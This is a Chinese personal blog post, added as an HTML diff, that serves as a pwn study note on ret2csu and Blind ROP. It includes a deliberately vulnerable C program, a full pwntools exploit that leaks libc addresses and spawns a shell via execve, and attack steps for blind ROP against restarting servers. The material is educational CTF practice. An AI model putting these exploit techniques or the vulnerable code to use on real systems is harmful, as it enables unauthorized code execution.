@@ -1,0 +1,271 @@
+
+<!DOCTYPE html>
+<html lang="Zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>汐白学Pwn-3.2(ROP-Intermediate) - 汐白的学习档案</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xibai,"> 
+    <meta name="description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,前面介绍了栈溢出的基础操作，现在开始应该才算是入门操作了
+ret2csu原理我们知道64位的程序，其函数传参时六个参数以内是通过rdi、rsi、rdx、rcx、r8、r9。也就是如果对64位程序进行,"> 
+    <meta name="author" content="Xibai"> 
+    <link rel="alternative" href="atom.xml" title="汐白的学习档案" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="汐白学Pwn-3.2(ROP-Intermediate) - 汐白的学习档案"/>
+    <meta name="twitter:description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,前面介绍了栈溢出的基础操作，现在开始应该才算是入门操作了
+ret2csu原理我们知道64位的程序，其函数传参时六个参数以内是通过rdi、rsi、rdx、rcx、r8、r9。也就是如果对64位程序进行,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="汐白的学习档案"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="汐白学Pwn-3.2(ROP-Intermediate) - 汐白的学习档案"/>
+    <meta property="og:description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,前面介绍了栈溢出的基础操作，现在开始应该才算是入门操作了
+ret2csu原理我们知道64位的程序，其函数传参时六个参数以内是通过rdi、rsi、rdx、rcx、r8、r9。也就是如果对64位程序进行,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">汐白的学习档案</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://xibai.xyz"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">汐白学Pwn-3.2(ROP-Intermediate)</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">汐白学Pwn-3.2(ROP-Intermediate)</h1>
+        <div class="stuff">
+            <span>四月 24, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>前面介绍了栈溢出的基础操作，现在开始应该才算是入门操作了</p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们知道64位的程序，其函数传参时六个参数以内是通过<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>。也就是如果对64位程序进行栈溢出攻击时，我们不是仅仅在栈上布置输入的数据，我们还要找到可以控制以上六个寄存器的<code>gadgets</code>，而正常情况下我们是很难找到六个寄存器各自对应的<code>gadgets</code>。这个时候，就需要用到<code>__libc_csu_init</code>这个函数了。一般情况下的程序在编译时，编译器会自动调用该函数来完成对<code>libc</code>的初始化操作。也就是大多数程序虽然在编写的时候没有用到该函数，但是编译器会自动为其添加该函数，这些程序也因此都会有这个函数。</p>
+<p>下面是我编译的程序反汇编后看到的这个函数的内容：(听说这玩意有很多不同版本，会有一些细节上的不一样，不过大同小异)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0000000000401190 &lt;__libc_csu_init&gt;:</span><br><span class="line">  401190: 41 57                 push   r15</span><br><span class="line">  401192: 4c 8d 3d df 1f 00 00  lea    r15,[rip+0x1fdf]        # 403178 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  401199: 41 56                 push   r14</span><br><span class="line">  40119b: 49 89 d6              mov    r14,rdx</span><br><span class="line">  40119e: 41 55                 push   r13</span><br><span class="line">  4011a0: 49 89 f5              mov    r13,rsi</span><br><span class="line">  4011a3: 41 54                 push   r12</span><br><span class="line">  4011a5: 41 89 fc              mov    r12d,edi</span><br><span class="line">  4011a8: 55                    push   rbp</span><br><span class="line">  4011a9: 48 8d 2d d0 1f 00 00  lea    rbp,[rip+0x1fd0]        # 403180 &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br><span class="line">  4011b0: 53                    push   rbx</span><br><span class="line">  4011b1: 4c 29 fd              sub    rbp,r15</span><br><span class="line">  4011b4: 48 83 ec 08           sub    rsp,0x8</span><br><span class="line">  4011b8: e8 43 fe ff ff        call   401000 &lt;_init&gt;</span><br><span class="line">  4011bd: 48 c1 fd 03           sar    rbp,0x3</span><br><span class="line">  4011c1: 74 1b                 je     4011de &lt;__libc_csu_init+0x4e&gt;</span><br><span class="line">  4011c3: 31 db                 xor    ebx,ebx</span><br><span class="line">  4011c5: 0f 1f 00              nop    DWORD PTR [rax]</span><br><span class="line">  4011c8: 4c 89 f2              mov    rdx,r14</span><br><span class="line">  4011cb: 4c 89 ee              mov    rsi,r13</span><br><span class="line">  4011ce: 44 89 e7              mov    edi,r12d</span><br><span class="line">  4011d1: 41 ff 14 df           call   QWORD PTR [r15+rbx*8]</span><br><span class="line">  4011d5: 48 83 c3 01           add    rbx,0x1</span><br><span class="line">  4011d9: 48 39 dd              cmp    rbp,rbx</span><br><span class="line">  4011dc: 75 ea                 jne    4011c8 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">  4011de: 48 83 c4 08           add    rsp,0x8</span><br><span class="line">  4011e2: 5b                    pop    rbx</span><br><span class="line">  4011e3: 5d                    pop    rbp</span><br><span class="line">  4011e4: 41 5c                 pop    r12</span><br><span class="line">  4011e6: 41 5d                 pop    r13</span><br><span class="line">  4011e8: 41 5e                 pop    r14</span><br><span class="line">  4011ea: 41 5f                 pop    r15</span><br><span class="line">  4011ec: c3                    ret</span><br></pre></td></tr></table></figure>
+<p>仔细观察一下就可以发现，我们可以通过<code>0x4011e2</code>处的 <strong>pop链</strong> 和 <code>0x4011c8</code>处的 <strong>mov链</strong> 控制程序执行一个已知地址的函数内容。<br>（ps：之所以控制的是<code>edi</code>而不是<code>rdi</code>寄存器却还能用来给函数传参是因为这里<code>rdi</code>寄存器的高三十二位值为0，可以自己编译一个小程序调试查看）<br>并且因为<strong>程序在执行时其实是cpu在执行程序中对应的机器码，所以最后的pop链其实可以通过控制地址偏移来实现不一样的pop链</strong>。<br>比如说，我们劫持<code>rip</code>后，控制地址为<code>0x4011e5</code>，此时将要执行的内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4011e5: 5c                   pop    rsp</span><br><span class="line">4011e6: 41 5d                pop    r13</span><br><span class="line">4011e8: 41 5e                pop    r14</span><br><span class="line">4011ea: 41 5f                pop    r15</span><br><span class="line">4011ec: c3                   ret</span><br></pre></td></tr></table></figure>
+<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>下面用实例演示对<code>__libc_csu_init</code>中的<code>gadgets</code>的利用:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序下载：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Intermediate%20ROP/ret2csu/level5">level5</a></p>
+<p><strong>将其作为64位程序进行编译，并且开启堆栈不可执行（NX）保护</strong>。<br>（注：另外注意，获取shell用的shellcode一般是调用execve(‘/bin/sh’,0,0)函数，因为system函数会受本地环境变量影响导致不可用。）</p>
+<p>该程序在<code>read()</code>时明显存在溢出，但是因为程序非常简单，所以无法找到其他直接控制传参寄存器的<code>gadgets</code>。所以我们覆盖返回地址为<code>__libc_csu_init</code>中的<code>gadgets</code>，然后布置相关参数。<br>这里的攻击思路是，先调用<code>write()</code>泄露<code>got</code>表中已经绑定的函数地址，然后查找到对应libc的版本计算出<code>execve()</code>的地址，然后通过<code>read()</code>将<code>/bin/sh</code>和<code>execve()的地址</code>写到<code>bss</code>段，最后再调用<code>execve()</code>获取shell。</p>
+<p>利用脚本如下：</p>
+<blockquote>
+<p>ps：因为我的本地libc库版本不在LibcSearcher使用的数据库中，<br>所以这里我是先泄露出需要的地址，然后手动查询libc库，从中获<br>取相关数据，所以脚本中会出现计算偏移的步骤中直接用的已知值<br>计算，这些已知值是查询到相关的libc库中对应的基址后写入的）</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入需要用到的地址</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">pop_ret = <span class="number">0x4011e2</span></span><br><span class="line">mov_call = <span class="number">0x4011c8</span></span><br><span class="line">execve_offset = <span class="number">0xcb140</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 csu 中的 gadgets的利用payload 写成函数方便每次使用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">a1,a2,a3,symbol_call</span>):</span><br><span class="line"> payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line"> payload += p64(pop_ret)</span><br><span class="line"> payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(a1) + p64(a2) + p64(a3) + p64(symbol_call)</span><br><span class="line"> payload += p64(mov_call)</span><br><span class="line"> payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line"> payload += p64(main)</span><br><span class="line"> p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;泄露 write 地址&quot;</span>)</span><br><span class="line">csu(<span class="number">1</span>,write_got,<span class="number">8</span>,write_got)</span><br><span class="line">write_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;泄露 read 地址&quot;</span>)</span><br><span class="line">csu(<span class="number">1</span>,read_got,<span class="number">8</span>,write_got)</span><br><span class="line">tmp = p.recv()</span><br><span class="line"><span class="built_in">print</span>(tmp.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;泄露 libc_start_main 地址&quot;</span>)</span><br><span class="line">csu(<span class="number">1</span>,libc_start_main_got,<span class="number">8</span>,write_got)</span><br><span class="line">libc_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc偏移量</span></span><br><span class="line">libcbase = libc_addr - <span class="number">0x026d20</span></span><br><span class="line">system_addr = <span class="number">0x048870</span> + libcbase</span><br><span class="line">bin_sh = <span class="number">0x1881ac</span> + libcbase</span><br><span class="line">execve_addr = execve_offset + libcbase</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>,bss_addr,<span class="number">16</span>,read_got)</span><br><span class="line">p.send( <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(execve_addr))</span><br><span class="line"></span><br><span class="line">csu(bss_addr,<span class="number">0</span>,<span class="number">0</span>,bss_addr+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Blind-ROP-盲打pwn"><a href="#Blind-ROP-盲打pwn" class="headerlink" title="Blind ROP(盲打pwn)"></a>Blind ROP(盲打pwn)</h2><p>去实战刷题发现，这东西姿势太多，真的顶不住啊，还是先把例题手撸一遍叭emmm</p>
+<blockquote>
+<p>u1s1，我为啥会觉得后面的高级ROP里面的<code>SROP</code>挺简单的放在这里这个位置其实就挺好，这玩意和接下来的<code>dl_runtime_resolve</code>一起放高级pwn，单纯的pwn小白个人感觉，如果有大佬在小白blog里无聊翻到这里请一笑略过</p>
+</blockquote>
+<p>这里就不像<code>ctf-wiki</code>那样讲的写的那么细了，就用小白入门的方式做个记录。</p>
+<h3 id="Blind-Pwn-原理"><a href="#Blind-Pwn-原理" class="headerlink" title="Blind Pwn 原理"></a>Blind Pwn 原理</h3><h4 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h4><p>一个字————猜！！！。什么花里胡哨的paper，其实中心思想就是 <strong>盲猜</strong> 23333.<br><del>鄙人汐小鹰赌你的程序有！漏！洞！</del></p>
+<p>当然，不能瞎吉儿猜，要有理有据的猜才行，毕竟有漏洞无伤大雅，谁写的程序还能没点毛病，关键是这个洞要能被攻击者测试出来，并且利用它实现特殊目的，它才能算是个有用的洞对不对。</p>
+<h4 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h4><ul>
+<li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li>
+<li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li>
+</ul>
+<h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><ul>
+<li>测试栈溢出长度，以及是否存在格式化字符串漏洞</li>
+<li>枚举一个可用的返回地址，该地址可用的判断条件是只要程序运行到这个地址，一定会出现什么特征，并能让攻击者知晓</li>
+<li>枚举一个<code>gadget</code>，一般是<code>libc_csu_init</code>的结尾那个<code>gadget</code></li>
+</ul>
+<h2 id="上篇-汐白学Pwn-3-1-ROP-Basic"><a href="#上篇-汐白学Pwn-3-1-ROP-Basic" class="headerlink" title="上篇-汐白学Pwn-3.1(ROP-Basic)/)"></a><a href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP">上篇-汐白学Pwn-3.1(ROP-Basic)</a>/)</h2><h2 id="下篇-未完待续"><a href="#下篇-未完待续" class="headerlink" title="下篇-未完待续"></a>下篇-未完待续</h2>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="true"
+        data-ci="5cd24ed310c0cbc2a2ed"
+        data-cs="51aa998e509794b7b061784f1f3d41018af118f6"
+        data-r="xikong-mubai.github.io"
+        data-o="xikong-mubai"
+        data-a="xikong-mubai"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.</span> <span class="toc-text">ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example"><span class="toc-number">1.2.</span> <span class="toc-text">example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-ROP-%E7%9B%B2%E6%89%93pwn"><span class="toc-number">2.</span> <span class="toc-text">Blind ROP(盲打pwn)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-Pwn-%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">Blind Pwn 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%80%9D%E6%83%B3"><span class="toc-number">2.1.1.</span> <span class="toc-text">核心思想</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.2.</span> <span class="toc-text">必要条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B"><span class="toc-number">2.1.3.</span> <span class="toc-text">攻击过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E7%AF%87-%E6%B1%90%E7%99%BD%E5%AD%A6Pwn-3-1-ROP-Basic"><span class="toc-number">3.</span> <span class="toc-text">上篇-汐白学Pwn-3.1(ROP-Basic)&#x2F;)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E7%AF%87-%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD"><span class="toc-number">4.</span> <span class="toc-text">下篇-未完待续</span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+
+<!--血小板代码-->
+<link rel="stylesheet" href="/live2d/css/live2d.css" />
+<div id="landlord">
+    <div class="message" style="opacity:0"></div>
+    <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
+    <div class="hide-button">隐藏</div>
+</div>
+<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var message_Path = '/live2d/'
+    var home_Path = 'https://calmcenter.club/'
+</script>
+<script type="text/javascript" src="/live2d/js/live2d.js"></script>
+<script type="text/javascript" src="/live2d/js/message.js"></script>
+<script type="text/javascript">
+    loadlive2d("live2d", "/live2d/model/kesshouban_v2/model.json");
+</script>
+<!--血小板代码-->
+
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
+        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
+        messageStyle: "none"
+    });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+
+</html>
